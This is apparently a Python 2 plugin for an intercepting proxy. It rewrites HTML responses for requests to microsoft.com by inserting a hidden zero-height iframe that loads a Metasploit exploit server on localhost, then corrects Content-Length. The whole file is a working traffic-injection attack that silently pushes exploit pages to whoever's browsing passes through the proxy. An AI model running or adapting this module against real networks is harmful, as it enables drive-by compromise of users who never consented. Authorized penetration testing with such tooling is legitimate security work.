#!/usr/bin/python
import urllib2
from BeautifulSoup import BeautifulSoup
import support.header as header

### CHANGE AS NEEDED
request_match = (("Host","microsoft.com"),)
response_match = (("Content-type","TEXT/HTML"),)
code1 = '''<iframe height=0 src="http://localhost:8000/metasploit"></iframe>'''



### FUNCTION TO MANIPULATE CLIENT REQUEST
def doRequest(session, request_header, data):
  changed = 0
  stop = 0
  return(request_header, data, changed, stop)



### FUNCTION TO MANIPULATE SERVER RESPONSE
def doResponse(session, request_header, response_header, data):
  changed = 0
  stop = 0

  ### DETERMINE IF WE NEED TO CHANGE DATA
  if header.headertest(request_header, request_match) & header.headertest(response_header, response_match):

    ### MANIPULATE DATA - INSERT SCRIPT
    soup = BeautifulSoup(data)
    soup.body.insert(-1, code1)
    changed = 1
    data = str(soup)
    print("Metasploit iframe injected")

  ### RETURN DATA
  header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')
  return(response_header, data, changed, stop)
